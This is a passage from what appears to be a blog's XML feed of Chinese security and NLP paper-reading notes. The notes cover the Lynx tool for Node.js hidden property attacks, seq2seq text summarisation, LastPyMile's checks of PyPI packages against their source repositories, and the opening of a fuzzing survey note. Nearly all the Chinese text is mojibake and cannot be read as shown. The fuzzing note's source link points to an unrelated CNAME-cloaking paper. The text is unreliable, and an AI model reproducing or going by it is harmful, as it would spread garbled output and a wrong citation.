Lynxè®¾è®¡ä¸å®ç°"></a>0x04 Lynxè®¾è®¡ä¸å®ç°</h2><h3 id="éšè—å±æ€§çš„å®šä¹‰"><a href="#éšè—å±æ€§çš„å®šä¹‰" class="headerlink" title="éšè—å±æ€§çš„å®šä¹‰"></a>éšè—å±æ€§çš„å®šä¹‰</h3><p>ç»™å®šä¸€ä¸ªæ¨¡å—ï¼Œå…¶åŒ…å«ä¸€ä¸ªè¾“å…¥å¯¹è±¡å’Œä¸€ä¸ªå†…éƒ¨å¯¹è±¡ã€‚æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ä¾¿å®šä¹‰ä¸€ä¸ªå±æ€§Pä¸ºè¾“å…¥å¯¹è±¡ä¸­çš„éšè—å±æ€§ï¼š</p><ol><li>è¿™ä¸ªå±æ€§På±äºå†…éƒ¨å¯¹è±¡ï¼Œä¸”åœ¨è¿™ä¸ªæ¨¡å—ä¸­è¢«å¼•ç”¨</li><li>å½“å‘ç”Ÿå±æ€§é‡åé—®é¢˜æ—¶ï¼Œå†…éƒ¨å¯¹è±¡çš„å±æ€§Pèƒ½å¤Ÿè¢«å¤–éƒ¨å¯¹è±¡çš„å±æ€§Pæ‰€è¦†ç›–</li><li>å±æ€§På¹¶ä¸æ˜¯è¾“å…¥å¯¹è±¡çš„é»˜è®¤å‚æ•°</li></ol><h3 id="æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ"></a>æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ</h3><h4 id="å¦‚ä½•å‘ç°Node-jsç¨‹åºçš„éšè—å±æ€§"><a href="#å¦‚ä½•å‘ç°Node-jsç¨‹åºçš„éšè—å±æ€§" class="headerlink" title="å¦‚ä½•å‘ç°Node.jsç¨‹åºçš„éšè—å±æ€§?"></a>å¦‚ä½•å‘ç°Node.jsç¨‹åºçš„éšè—å±æ€§?</h4><p>ä½œè€…è®¾è®¡äº†ä¸€ç§ç»“åˆäº†åŠ¨æ€å’Œé™æ€åˆ†æå„è‡ªä¼˜åŠ¿çš„æ–¹æ³•ç”¨ä»¥å‘ç°éšè—å±æ€§ã€‚é¦–å…ˆï¼Œåˆ©ç”¨äº†ä¸€ä¸ªè½»é‡çº§çš„æ ‡è®°ç³»ç»Ÿæ¥åŠ¨æ€è·Ÿè¸ªè¾“å…¥å¯¹è±¡å’Œç›¸å…³å±æ€§è½½ä½“ï¼Œå¹¶å°†å±æ€§è½½ä½“çš„æ‰€æœ‰å±æ€§ä½œä¸ºéšè—å±æ€§å€™é€‰ã€‚ä¸ºäº†å°½å¯èƒ½å¤šåœ°å‘ç°æ‰§è¡Œè·¯å¾„ï¼Œå°¤å…¶æ˜¯ä¸€äº›å…³é”®è·¯å¾„ï¼Œä½œè€…å¯¹è¾“å…¥å¯¹è±¡è¿›è¡Œäº†å¹¿æ³›åœ°é€’å½’æ ‡è®°ï¼Œå¹¶å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œäº†æµ‹è¯•ã€‚ä½†ä¸Šè¿°çš„åŠ¨æ€æµ‹è¯•è¿˜æ˜¯ä¼šé€ æˆä¸€äº›å‡é˜´æ€§ï¼Œè¿™æ˜¯å› ä¸ºå¾ˆå¤šæ—¶å€™å³ä½¿ç›¸åº”çš„å±æ€§è½½ä½“è¢«æ ‡è®°äº†ï¼Œæœ€ä¸ºé‡è¦çš„éšè—å±æ€§å´è¢«å¿½ç•¥äº†ã€‚ä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œä½œè€…é€šè¿‡è´ªå©ªç®—æ³•æœç´¢é‚£äº›è¢«å¿½ç•¥çš„å±æ€§ï¼Œç„¶åå¼•å…¥é™æ€åˆ†æã€‚æœ€ç»ˆï¼Œå¾—åˆ°ä¸€ä¸ªéšè—å±æ€§å€™é€‰åˆ—è¡¨ã€‚</p><h4 id="åœ¨å¤§é‡çš„éšè—å±æ€§ä¸­ï¼Œå¦‚ä½•ç¡®å®šå“ªäº›å±æ€§å¯¹æ”»å‡»è€…è€Œè¨€æ˜¯æœ‰ä»·å€¼å’Œå¯åˆ©ç”¨çš„ï¼Ÿ"><a href="#åœ¨å¤§é‡çš„éšè—å±æ€§ä¸­ï¼Œå¦‚ä½•ç¡®å®šå“ªäº›å±æ€§å¯¹æ”»å‡»è€…è€Œè¨€æ˜¯æœ‰ä»·å€¼å’Œå¯åˆ©ç”¨çš„ï¼Ÿ" class="headerlink" title="åœ¨å¤§é‡çš„éšè—å±æ€§ä¸­ï¼Œå¦‚ä½•ç¡®å®šå“ªäº›å±æ€§å¯¹æ”»å‡»è€…è€Œè¨€æ˜¯æœ‰ä»·å€¼å’Œå¯åˆ©ç”¨çš„ï¼Ÿ"></a>åœ¨å¤§é‡çš„éšè—å±æ€§ä¸­ï¼Œå¦‚ä½•ç¡®å®šå“ªäº›å±æ€§å¯¹æ”»å‡»è€…è€Œè¨€æ˜¯æœ‰ä»·å€¼å’Œå¯åˆ©ç”¨çš„ï¼Ÿ</h4><p>ä½œè€…åˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¥æ¢ç´¢æ‰€æœ‰ç›¸å…³çš„è·¯å¾„ï¼Œæ”¶é›†è·¯å¾„çº¦æŸï¼Œæ£€æµ‹æ•æ„Ÿè¡Œä¸ºï¼Œå¹¶æœ€ç»ˆç”Ÿæˆæ¼æ´åˆ©ç”¨æ–¹æ¡ˆã€‚</p><h3 id="è®¾è®¡æ€»è§ˆ"><a href="#è®¾è®¡æ€»è§ˆ" class="headerlink" title="è®¾è®¡æ€»è§ˆ"></a>è®¾è®¡æ€»è§ˆ</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ad4e1c43-6796-4bde-bfe8-3acdd7d21c70.png"><br>ç¬¬ä¸€éƒ¨åˆ†ï¼ŒLYNXä¼šåŠ¨æ€åœ°è¿è¡Œä¸€ä¸ªæ ‡è®°ç³»ç»Ÿï¼Œç”¨äºé€’å½’åœ°è·Ÿè¸ªè¾“å…¥å¯¹è±¡ï¼Œå¹¶å°½å¯èƒ½å¤šåœ°è¯†åˆ«å±æ€§è½½ä½“ã€‚ç„¶åé€šè¿‡æ”¶é›†ä¸Šè¿°æ ‡è®°ç»“æœï¼Œå¼•å…¥é™æ€åˆ†ææ¥æœç´¢é‚£äº›è¢«å¿½ç•¥çš„éšè—å±æ€§ï¼Œæ„å»ºéšè—å±æ€§å€™é€‰åˆ—è¡¨ã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ï¼ŒLYNXé¦–å…ˆåˆ©ç”¨ç¬¬ä¸€éƒ¨åˆ†å¾—åˆ°çš„éšè—å±æ€§å€™é€‰åˆ—è¡¨ç”Ÿæˆæ¼æ´æ¨¡æ¿ï¼Œè¿è¡Œç¬¦å·æ‰§è¡Œæ¥æ¨ç†å¾—å‡ºéšè—å±æ€§çš„å€¼ï¼Œä»¥æ­¤éªŒè¯å…¶æœ‰å®³æ€§åŠæ”»å‡»ç»“æœã€‚</p><h2 id="0x05-å±€é™æ€§"><a href="#0x05-å±€é™æ€§" class="headerlink" title="0x05 å±€é™æ€§"></a>0x05 å±€é™æ€§</h2><ul><li>ä¾èµ–å¤–éƒ¨è¾“å…¥æ¥è§¦å‘åˆ†æè¿‡ç¨‹</li><li>ä¸å…¶ä»–åŠ¨æ€åˆ†æå·¥å…·ä¸€æ ·ï¼Œå­˜åœ¨è®¸å¤šçš„å‡é˜´æ€§</li><li>å¹¶æ²¡æœ‰è¦†ç›–å®Œæ•´çš„Node.jsç”Ÿæ€</li></ul>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSS Security </tag>
            
            <tag> Node.js </tag>
            
            <tag> Code Analysis </tag>
            
            <tag> USENIX Security&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RL - Automatic Text Summary Method</title>
      <link href="/2021/07/12/Automatic%20Text%20Summary%20Method/"/>
      <url>/2021/07/12/Automatic%20Text%20Summary%20Method/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šWei Wang</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šGenerated Automatic Summary Method Based on C-R Neural</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://d.wanfangdata.com.cn/periodical/jsjyszgc202001022">https://d.wanfangdata.com.cn/periodical/jsjyszgc202001022</a></em></p><p><em>åŸæ–‡æ¥æºï¼šWanFang</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h1 id="ç”Ÿæˆå¼è‡ªåŠ¨æ‘˜è¦æ–¹æ³•"><a href="#ç”Ÿæˆå¼è‡ªåŠ¨æ‘˜è¦æ–¹æ³•" class="headerlink" title="ç”Ÿæˆå¼è‡ªåŠ¨æ‘˜è¦æ–¹æ³•"></a>ç”Ÿæˆå¼è‡ªåŠ¨æ‘˜è¦æ–¹æ³•</h1><p>ç”Ÿæˆå¼æ–‡æœ¬æ‘˜è¦æ˜¯æ›´æ¥è¿‘äºäººç±»æ€è€ƒæ–¹å¼çš„æ‘˜è¦ç”Ÿæˆæ–¹æ³•ï¼Œå…·æœ‰æ›´å¼ºçš„ç”Ÿæˆã€ç†è§£ã€è¡¨å¾æ–‡æœ¬çš„èƒ½åŠ›ã€‚ç”Ÿæˆå¼ç¥ç»ç½‘ç»œæ¨¡å‹çš„åŸºæœ¬ç»“æ„æ˜¯ç”±ç¼–ç å’Œè§£ç å™¨ç»„æˆï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210712155233413.png" alt="image-20210712155233413"></p><p>Seq2Seq åºåˆ—åˆç§°ä¸ºç¼–è§£ç å™¨ï¼ˆEncoderã€Decoderï¼‰æ¶æ„ï¼Œç¼–ç å™¨è´Ÿè´£å°†è¾“å…¥æ–‡æœ¬ç¼–ç æˆä¸€ä¸ªå‘é‡ï¼Œä½œä¸ºåŸæ–‡æœ¬çš„è¡¨å¾ï¼Œè¯¥å‘é‡åŒ…å«äº†æ–‡æœ¬çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚è€Œè§£ç å™¨ä»è¯¥å‘é‡æå–é‡è¦ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œå‰ªè¾‘åŠ å·¥ï¼Œç”Ÿæˆæ–‡æœ¬æ‘˜è¦ï¼Œè¿™å¥—æ¶æ„å°±æ˜¯ Seq2Seqã€‚ è¯¥æ–¹æ³•è¢«å¹¿æ³›åº”ç”¨äºå­˜åœ¨è¾“å…¥å’Œè¾“å‡ºåºåˆ—çš„åœºæ™¯ï¼Œ Seq2Seqæ¶æ„ä¸­çš„ç¼–ç å™¨å’Œè§£ç å™¨é€šå¸¸ç”±æ—¶é—´é€’å½’ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰æˆ–å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰å®ç°ã€‚</p><h2 id="åŸºäºRNNçš„ç”Ÿæˆå¼ç»“æ„"><a href="#åŸºäºRNNçš„ç”Ÿæˆå¼ç»“æ„" class="headerlink" title="åŸºäºRNNçš„ç”Ÿæˆå¼ç»“æ„"></a>åŸºäºRNNçš„ç”Ÿæˆå¼ç»“æ„</h2><p>â€œåºåˆ—åˆ°åºåˆ—â€æ–¹æ³•åœ¨å¾ˆå¤šæ–‡æœ¬å¤„ç†ä¸­æœ‰å¾ˆå¥½çš„æ•ˆæœã€‚ç›¸è¾ƒäºä»åŸæ–‡æœ¬ä¸­æŠ½å–å¼è·å¾—æ‘˜è¦ï¼Œä»åºåˆ—åˆ°åºåˆ—å»ºæ¨¡å¤„ç†æ–¹æ³•ï¼Œå…¶æ‘˜è¦é•¿åº¦å¹¶ä¸ä¾èµ–äºåŸæ–‡æœ¬é•¿åº¦ï¼Œè€Œä¸”ç›¸å¯¹äºåŸæ–‡æ‘˜è¦å¿…ç„¶æœ‰ä¿¡æ¯æŸå¤±ã€‚</p><p>Chopraç­‰ä½¿ç”¨é€’å½’ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰ä½œä¸ºè§£ç å™¨ã€‚(Abstractive Sentence Summarization with Attentive Recurrent Neural Networks)</p><h2 id="åŸºäºCNNçš„ç”Ÿæˆå¼ç»“æ„"><a href="#åŸºäºCNNçš„ç”Ÿæˆå¼ç»“æ„" class="headerlink" title="åŸºäºCNNçš„ç”Ÿæˆå¼ç»“æ„"></a>åŸºäºCNNçš„ç”Ÿæˆå¼ç»“æ„</h2><p>CNNçš„ç®—æ³•ä¼˜åŠ¿æ˜¯å¯ä»¥æå–å‡ºå±‚æ¬¡ç‰¹å¾ï¼Œå¹¶å¯ä»¥é«˜æ•ˆå¹¶è¡Œåœ°è¿›è¡Œå·ç§¯è¿ç®—ï¼Œæ ¹æ®å…¶ç‰¹ç‚¹ï¼Œå¯å°†CNNåº”ç”¨åˆ°ç›¸å…³æ–‡æœ¬ä»»åŠ¡ä¸­ï¼Œä½†åŸç”Ÿæ€çš„æ–‡æœ¬å­—ç¬¦ä¸²æ— æ³•è¿›è¡Œè®¡ç®—ï¼Œéœ€å°†æ–‡æœ¬è¡¨ç¤ºä¸ºåˆ†å¸ƒå¼å‘é‡ ï¼ˆDistributed Representation/Word Embeddingï¼‰ã€‚å¯ä»¥ç”¨ä¸€ä¸ªå®æ•°çŸ©é˜µæˆ–å‘é‡è¡¨ç¤ºä¸€å¥è¯æˆ–ä¸€ä¸ªè¯ï¼Œç»è¿‡åˆ†å¸ƒå¼å‘é‡è¡¨ç¤ºåï¼Œå°±å¯ä»¥åœ¨æ–‡æœ¬ä»»åŠ¡ä¸­åº”ç”¨CNNã€‚ä½†CNNæå–çš„æ–‡æœ¬ç‰¹å¾ï¼Œå¹¶ä¸èƒ½å¦‚å›¾åƒç‰¹å¾é‚£æ ·ï¼Œæœ‰æ˜æ˜¾çš„å¯è§£é‡Šæ€§å’Œå¯è§†æ€§ã€‚CNN æŠ½å–çš„æ–‡æœ¬ç‰¹å¾å¯ä»¥ç±»æ¯”è‡ªç„¶è¯­è¨€å¤„ç†ä¸­çš„åˆ†ææ ‘ï¼ˆSyntactic Parsing Treeï¼‰ã€‚</p><p>Facebook å…¬å¸æå‡ºçš„ ConvS2S æ¨¡å‹ï¼Œç”± CNN å®ç°ç¼–ç å™¨å’Œè§£ç å™¨ï¼ŒåŒæ—¶åŠ å…¥äº†æ³¨æ„åŠ›æœºåˆ¶ï¼Œå°è¯•å°†è¯¥æ¨¡å‹ç”¨äºè‡ªåŠ¨æ–‡æœ¬æ‘˜è¦ã€‚</p><h2 id="åŸºäºAttentionçš„ç”Ÿæˆå¼ç»“æ„"><a href="#åŸºäºAttentionçš„ç”Ÿæˆå¼ç»“æ„" class="headerlink" title="åŸºäºAttentionçš„ç”Ÿæˆå¼ç»“æ„"></a>åŸºäºAttentionçš„ç”Ÿæˆå¼ç»“æ„</h2><p>ç¼–ç å™¨å°†åŸæ–‡ç¼–ç ä¸ºå‘é‡Vï¼Œè€Œè§£ç å™¨ä»å‘é‡ V ä¸­æå–ä¿¡æ¯ã€è·å–è¯­ä¹‰ã€ç”Ÿæˆæ–‡æœ¬æ‘˜è¦ã€‚è‡ªæ³¨æ„åŠ›æ¨¡å‹æ›´åŠ å…³æ³¨å¥å­å†…éƒ¨ç»“æ„ï¼Œå³Word-Pairsçš„ä¿¡æ¯ã€‚æ¨¡å‹å•ç‹¬å­¦ä¹ ç›®æ ‡ç«¯å¥å­å†…éƒ¨ç»“æ„ä¿¡æ¯ï¼Œåˆ©ç”¨ç¼–è§£ç å™¨æ³¨æ„åŠ›å»ºç«‹æºæ–‡æœ¬å’Œç›®æ ‡æ–‡æœ¬çš„å¯¹åº”å…³ç³»ã€‚è‡ªæ³¨æ„åŠ›åœ¨ç¬¬ä¸€å±‚ä¾¿å·§å¦™åœ°å»ºç«‹äº†è¯å’Œæ•´ä¸ªå¥å­çš„è”ç³»ï¼Œå…¶æ€æƒ³å¯ç”¨äºæ–‡æœ¬æ‘˜è¦è‡ªåŠ¨ç”Ÿæˆä»»åŠ¡ã€‚</p><p>Google å›¢é˜Ÿä½¿ç”¨è‡ªæ³¨æ„åŠ›ï¼ˆSelf-Attentionï¼‰å’Œç¼–è§£ç å™¨æ³¨æ„åŠ›ï¼ˆEncoder-Decoder Attentionï¼‰ï¼Œæ¥å®Œå…¨å®ç°ç«¯åˆ°ç«¯ä»»åŠ¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Research Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Text Summery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - LastPyMile: Identifying the Discrepancy between Sources and Packages</title>
      <link href="/2021/06/25/LastPyMile%20-%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/"/>
      <url>/2021/06/25/LastPyMile%20-%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šDuc-Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šLastPyMile: Identifying the Discrepancy between Sources and Packages</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šESEC/FSE 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h1 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h1><p>é€šå¸¸æƒ…å†µä¸‹å¼€æºçš„è½¯ä»¶åŒ…ä¼šåœ¨å…¶å¯¹åº”çš„å­˜å‚¨åº“ä¸Šæä¾›æºä»£ç ï¼Œä½†å¼€å‘è€…å¾€å¾€æ›´å€¾å‘äºä½¿ç”¨é›†æˆå¼çš„åŒ…ç®¡ç†å™¨æ¥ä½¿ç”¨è¿™äº›å¼€æºè½¯ä»¶åŒ…ï¼ˆPyPIå¯¹åº”çš„pipï¼‰ã€‚è¿™ç§æ–¹ä¾¿çš„åšæ³•æ˜¯å‡è®¾æºä»£ç å’Œè½¯ä»¶åŒ…ä¹‹é—´æ²¡æœ‰å·®å¼‚çš„ï¼Œè¿™ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ã€‚ä½œè€…æå‡ºå¹¶å®ç°äº†ä¸€ç§æ–¹æ³•ï¼Œåä¸ºLastPyMileï¼Œä¸»è¦ç”¨äºè¯†åˆ«è½¯ä»¶åŒ…çš„æ„é€ å’Œå…¶æºä»£ç åº“ä¹‹é—´çš„å·®å¼‚ï¼Œä»¥é˜²æ­¢æ¶æ„è½¯ä»¶çš„æ³¨å…¥ã€‚</p><p>ä»¥PyPIä¸ºä¾‹ï¼Œä½œè€…åšäº†è¯¦ç»†çš„è°ƒæŸ¥ã€‚ä¸‹å›¾ä¸ºPyPIåŒ…çš„ç”Ÿå‘½å‘¨æœŸ</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210625145547515.png" alt="image-20210625145547515"></p><p>ä½œè€…è‡´åŠ›äºå®¡æŸ¥ä»£ç æ³¨å…¥çš„é—®é¢˜ï¼Œ è€Œä»£ç æ³¨å…¥æ”»å‡»ä¸­ï¼Œå¾€å¾€åªä¼šæœ‰å°‘é‡ä»£ç è¢«ä¿®æ”¹ã€‚äºæ˜¯ä»è¿™ä¸€ç‚¹å‡ºå‘ä½œè€…æå‡ºäº†ä¸‰ä¸ªé—®é¢˜ï¼š</p><h2 id="RQ1-èƒ½å¦æœ‰æ•ˆåœ°è¯†åˆ«å·®å¼‚ï¼Ÿ"><a href="#RQ1-èƒ½å¦æœ‰æ•ˆåœ°è¯†åˆ«å·®å¼‚ï¼Ÿ" class="headerlink" title="RQ1: èƒ½å¦æœ‰æ•ˆåœ°è¯†åˆ«å·®å¼‚ï¼Ÿ"></a>RQ1: èƒ½å¦æœ‰æ•ˆåœ°è¯†åˆ«å·®å¼‚ï¼Ÿ</h2><p>æœ‰ä¸€ç§ç°æˆçš„è§£å†³æ–¹æ¡ˆï¼Œå³git logï¼Œä½†æ˜¯ç”±äºgitæ—¥å¿—éœ€è¦å¾ªç¯æŸ¥çœ‹æ‰€æœ‰ä¿®è®¢ç‰ˆï¼Œè€Œä¸”æ¯æ¬¡è°ƒç”¨éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ— ç–‘æ˜¯å¢åŠ äº†åˆ†ææœºå™¨çš„è´Ÿæ‹…ã€‚ä½œè€…çš„è§£å†³åŠæ³•åˆ™æ˜¯é€šè¿‡å·§å¦™åœ°ç»“åˆè½¯ä»¶åŒ…å’Œè¿è¡Œè½¯ä»¶çš„æ‰€æœ‰å¿…éœ€é¡¹ç›®çš„æ•£åˆ—å€¼ï¼Œä»¥ä¸€ç§å¯æ‰©å±•çš„æ–¹å¼æå–è¿™äº›å·®å¼‚ã€‚</p><p><strong>Answer</strong></p><ol><li>LastPyMileè¿­ä»£æ‰€æœ‰çš„æäº¤ï¼Œä»¥è®¡ç®—æ‰€æœ‰çš„æ–‡ä»¶å“ˆå¸Œå€¼å¹¶æ”¶é›†æºä»£ç åº“ä¸­çš„è¡Œå†…å®¹ã€‚</li><li>LastPyMileå¤„ç†ä¸€ä¸ªè½¯ä»¶åŒ…è¿è¡Œæ‰€éœ€è¦çš„ç»„ä»¶æ¥è®¡ç®—æ–‡ä»¶å“ˆå¸Œå€¼å¹¶æ”¶é›†æ–‡ä»¶è¡Œæ•°ã€‚</li><li>LastPyMileå°†æ‰€æœ‰è®¡ç®—å¥½çš„æ–‡ä»¶å“ˆå¸Œå€¼å’Œè¡Œæ•°ä¸æºä»£ç åº“ä¸­çš„æ–‡ä»¶å“ˆå¸Œå€¼å’Œè¡Œæ•°è¿›è¡Œæ¯”è¾ƒï¼ŒæŠ¥å‘Šé‚£äº›å·®å¼‚æ€§æ–‡ä»¶å’Œè¡Œæ•°ã€‚</li></ol><h2 id="RQ2-æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ"><a href="#RQ2-æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ" class="headerlink" title="RQ2: æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ"></a>RQ2: æºä»£ç å’ŒåŒ…å­˜å‚¨åº“ä¹‹é—´çš„â€œæ­£å¸¸â€å·®å¼‚æœ‰å¤šå¤§ï¼Ÿ</h2><p>ä½œè€…ç ”ç©¶äº†PyPIç”Ÿæ€ä¸­è¶…è¿‡2000ä¸ªæµè¡Œçš„è½¯ä»¶åŒ…ï¼Œè¿™ç§å·®å¼‚æ˜¯æ™®éå­˜åœ¨çš„ã€‚ä½†åœ¨Pythonæºæ–‡ä»¶ä¸­ä¸€èˆ¬åªä¼šå‘ç”Ÿå¾ˆå°‘çš„ä¿®æ”¹ï¼Œæ‰€ä»¥ä½œè€…é‡‡ç”¨å®¡æŸ¥ä½œä¸ºæ›¿ä»£æ–¹æ¡ˆã€‚</p><p><strong>Answer</strong></p><ol><li>æ¯”è¾ƒPyPIä¸­çš„ä»£ç å’Œç›¸åº”çš„æºä»£ç åº“ï¼Œå¹³å‡æœ‰5.8%çš„è¿è¡Œæ—¶éœ€è¦æ–‡ä»¶å’Œ2.6%çš„æ™®é€šæ–‡ä»¶æœ‰å·®å¼‚ã€‚</li></ol><p>ä½œè€…æåˆ°äº†å¯ç–‘APIsçš„è°ƒç”¨ï¼Œè¯´ä¸èƒ½ç®€å•åœ°å°†è°ƒç”¨å®šä¹‰ä¸ºå¯ç–‘ï¼Œä¼šäº§ç”Ÿå¤§é‡å‘Šè­¦ã€‚è¿™é‡Œå­˜ç–‘ï¼Œå› ä¸ºå‘Šè­¦å’Œæ¼æŠ¥çš„å¹³è¡¡ç‚¹å®åœ¨æ˜¯å¾ˆéš¾ç•Œå®šã€‚</p><h2 id="RQ3-LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ"><a href="#RQ3-LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ" class="headerlink" title="RQ3: LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ"></a>RQ3: LastPyMileèƒ½å¦ä¸è½¯ä»¶åŒ…æ‰«æå™¨ç›¸ç»“åˆï¼ŒåŒæ—¶ä¿æŒå¯æ§çš„è­¦æŠ¥æ•°é‡ï¼Ÿ</h2><p>ä¸ºäº†åœ¨è¯¥é¢†åŸŸå‘æŒ¥æ•ˆåŠ›ï¼Œæˆ‘ä»¬åº”è¯¥å…è®¸å¼€å‘è€…å’Œå¼€å‘ç»„ç»‡ä½¿ç”¨ç›¸åŒçš„å·¥å…·æ¥æ‰«æè½¯ä»¶åŒ…çš„æºä»£ç åº“ï¼Œä½œä¸ºå…¶å®¡æŸ¥è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚ç»“åˆLastPyMileå¯ä»¥æ˜¾è‘—é™ä½ç°æœ‰æ£€æµ‹è½¯ä»¶çš„å‘Šè­¦æ•°é‡</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>æ¶æ„ä»£ç å¯ä»¥éšè—åœ¨è®¸å¤šå…¶ä»–å½¢å¼ä¸­ï¼Œå¦‚ç½‘é¡µï¼ˆåµŒå…¥æˆ–å¤–éƒ¨JavaScriptçš„HTMLï¼‰æˆ–é…ç½®æ–‡ä»¶ï¼ˆå¸¦æœ‰æ¶æ„ä¾èµ–çš„requirements.txtï¼‰ã€‚æˆ‘ä»¬æ³¨æ„åˆ°å¤§é‡çš„ä¾èµ–æ€§å£°æ˜æ–‡ä»¶requirements.txtï¼Œå…¶ä¸­åŒ…å«ä½¿ç”¨pip installè‡ªåŠ¨å®‰è£…çš„ä¾èµ–æ€§åˆ—è¡¨ã€‚</p><p>ç¡®å®ï¼Œå¾€å¾€æŠ€è‰ºä¸ç²¾çš„å¼€å‘è€…æ‹¿ç€ä¸€ä¸ªå¯é‡ç”¨å®‰è£…åŒ…çš„æ—¶å€™æ˜¯ä¸å¤ªä¼šå…³å¿ƒrequirements.txté‡Œåˆ°åº•æœ‰å“ªäº›åŒ…ï¼Œè¿™äº›åŒ…åˆæ˜¯å“ªäº›ç‰ˆæœ¬ï¼ˆæ˜¯ä¸æ˜¯èƒ½å¤Ÿè¢«æ”»å‡»è€…æ”»å‡»åˆ©ç”¨çš„ç‰ˆæœ¬ï¼‰ï¼Œä¸€æ—¦æ‰§è¡Œäº†pip install -r requirements.txtï¼Œå°±ä¼šé¡ºåºå®‰è£…æ‰€æœ‰æ¡ç›®ï¼Œè¿™è€å®è¯´æ˜¯æœ‰æ½œåœ¨é£é™©çš„ï¼Œå¯ä»¥ç ”ç©¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ESEC/FSE&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fuzzing: a survey</title>
      <link href="/2021/06/18/Fuzzing%20-%20a%20survey/"/>
      <url>/2021/06/18/Fuzzing%20-%20a%20survey/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šJ Li, B Zhao, C Zhang</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šFuzzing a survey</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼š<a href="https://cybersecurity.springeropen.com/">Cybersecurity</a></em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>â€‹    